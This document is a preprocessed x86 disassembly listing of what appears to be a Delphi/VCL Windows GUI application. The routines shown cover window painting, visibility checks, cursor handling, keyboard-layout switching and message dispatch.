mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_441cf0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441564
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441d10
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_441564
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441d84
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441564
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441da4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441564
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441dc4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x8 ]
call sub_441564
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441de8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0xc ]
call sub_441564
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441e0c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_441564
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441e30
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x4 ]
call sub_441564
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441e50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov ecx ebx
mov eax ebx
call sub_440de4
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441e84
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_42f0b8
mov edi eax
mov eax edi
call sub_42f1c0
test al al
je r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x1a4 ]
call sub_423efc
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443be8
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_42f2c0
jmp r-xdata
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_438e90
jmp r-xdata
sub_441f24
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1d9 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x1b4 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x1b4 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
movzx eax [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_43e208
test bl bl
je r-xdata
mov eax edi
call sub_443f94
mov eax edi
call sub_443aec
pop edx
pop edi
pop esi
pop ebx
retn
movzx eax [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_443aec
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_441fe4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_43de44
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_442038
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_443f94
mov eax esi
call sub_43ecbc
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43fabc
test [ esi + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov si 0xffcf
call sub_404160
sub_44208c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x1b4 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
movzx edi [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
push 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_43bc78
lea edx [ esp + 0x10 ]
xor ecx ecx
mov eax ebx
call sub_440d20
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45828c
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456450
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
movzx edi [ eax + 0x7c ]
mov di 0xfffe
jmp r-xdata
movzx edi [ ebx + 0x7c ]
mov di 0xfffe
jmp r-xdata
sub_4421f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44230f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442316
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
cmp [ esi + 0x1bc ] 0x0
je r-xdata
mov eax esi
call sub_443be8
movzx edx [ esi + 0x1b8 ]
call sub_449088
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4563c8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x1bc ]
test ebx ebx
je r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push edi
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
push ebx
mov eax [ esi + 0x1bc ]
call sub_405324
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4561c8
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edi [ eax + 0x3c ]
cmp [ esi + 0x1b8 ] 0x0
je r-xdata
push 0x1
push edi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4561c8
mov edx [ esi + 0x1bc ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4561c8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
sub_442320
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4423ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4423f6
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
cmp [ ebx + 0x1bc ] 0x0
je r-xdata
cmp [ ebx + 0x1b8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4563c8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1bc ]
test esi esi
je r-xdata
mov eax ebx
call sub_443be8
mov dl 0x1
call sub_44906c
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
push edi
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
push esi
mov eax [ ebx + 0x1bc ]
call sub_405324
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_442454
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ ebp + 0x8 ]
mov eax edi
call sub_415360
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_43d400
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1e2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_4424a4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_4424d8
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffd1
call sub_404160
mov eax [ ebp + 0x10 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc2
call sub_404160
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn 0xc
sub_44251c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x222 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_43d400
test eax eax
je r-xdata
mov [ esp ] al
movzx eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_442578
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41df7c
mov edx [ r-xdata ]
call sub_404114
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_4425b0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x1ac ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4167c8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4425d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_443be8
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x202 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x204 ]
call [ ebx + 0x200 ]
sub_442630
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_44259c
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x1ac ]
call sub_4167c8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_442670
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x1b0 ]
call sub_406b0c
cmp [ ebx + 0x1dc ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1db ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x44 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x240 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_406b0c
jmp r-xdata
sub edx 0xffffff88
cmp [ ebx + 0x240 ] 0x0
jne r-xdata
sub_4426dc
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x55 ] 0x8
setne al
xor al 0x1
cmp dl al
je r-xdata
test dl dl
jne r-xdata
and [ ebx + 0x54 ] 0xf7ff
or [ ebx + 0x54 ] 0x800
jmp r-xdata
mov eax ebx
call sub_440990
sub_442710
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4427b8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1dc ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4427bf
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
mov [ edi + 0x1dc ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_439a44
test bl bl
jne r-xdata
cmp [ edi + 0x1ac ] 0x0
jne r-xdata
mov eax [ edi + 0x1ac ]
call sub_403f64
xor eax eax
mov [ edi + 0x1ac ] eax
lea eax [ edi + 0x1b0 ]
call sub_406af4
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc5
call sub_404160
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x1b0 ]
call sub_406b0c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ edi + 0x1ac ] eax
sub_4427c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x4c ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_43fa94
xor edx edx
push ebp
push sub_44288b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x40 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_404160
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442892
mov eax [ ebp - 0x4 ]
call sub_43fa9c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x60 ]
push edx
mov edx [ ebp - 0x8 ]
movzx ecx [ eax + 0x5c ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_442892
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44e778
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43c3a8
sub_4428e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_403e3c
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43e61c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44294b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x4c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43c3a8
sub_442964
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x20a ] 0x0
je r-xdata
pop edx
pop ebx
retn
movzx ecx [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x20c ]
call [ ebx + 0x208 ]
sub_442990
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov bl 0x1
xor edx edx
mov eax esi
call sub_44e778
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44e638
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
movzx ecx [ esp ]
mov eax esi
mov si 0xffba
call sub_404160
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x275 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebp
call sub_442990
test al al
jne r-xdata
mov dl 0x1
mov eax ebp
call sub_44e778
mov [ esp + 0x4 ] eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp ebp [ esp + 0x4 ]
je r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax + 0x275 ] 0x0
je r-xdata
mov edx edi
mov eax [ esp + 0x4 ]
call sub_442990
test al al
jne r-xdata
sub_442a38
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442990
test al al
jne r-xdata
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_444ed0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442a64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442990
test al al
jne r-xdata
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_444ed0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442a90
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x21a ] 0x0
je r-xdata
pop edx
pop ebx
retn
movzx ecx [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_442abc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov dl 0x1
mov eax esi
call sub_44e778
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44e638
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
movzx ecx [ esp ]
mov eax esi
mov si 0xffb9
call sub_404160
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x275 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_442abc
test al al
jne r-xdata
sub_442b24
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442abc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442b44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442abc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442b84
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov dl 0x1
mov eax esi
call sub_44e778
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
movzx eax [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffb8
call sub_404160
movzx eax [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x275 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_442b84
test al al
jne r-xdata
sub_442bec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442b84
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442c0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43ff78
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43ff3c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_43d400
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_442c0c
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_442cbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_442c0c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x1b4 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44e778
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_43d400
test eax eax
jne r-xdata
sub_442d68
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441564
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442d88
push ebx
push esi
push edi
mov ebx edx
mov edi eax
movzx esi [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441564
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442dbc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441564
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442ddc
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
cmp [ ebx + 0x64 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44504c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43c0b8
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_40a530
mov ebp eax
mov [ ebx + 0x64 ] ebp
mov eax ebp
call sub_40a544
mov ecx eax
mov edx ebp
mov eax ebx
call sub_43c0c8
mov eax r-xdata
call sub_40a550
mov [ ebx + 0x64 ] eax
jmp r-xdata
sub_442e5c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_442e80
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
movzx edx [ esp ]
mov eax ebp
call sub_43b1a4
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_43ff78
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_43ff3c
movzx edx [ esp ]
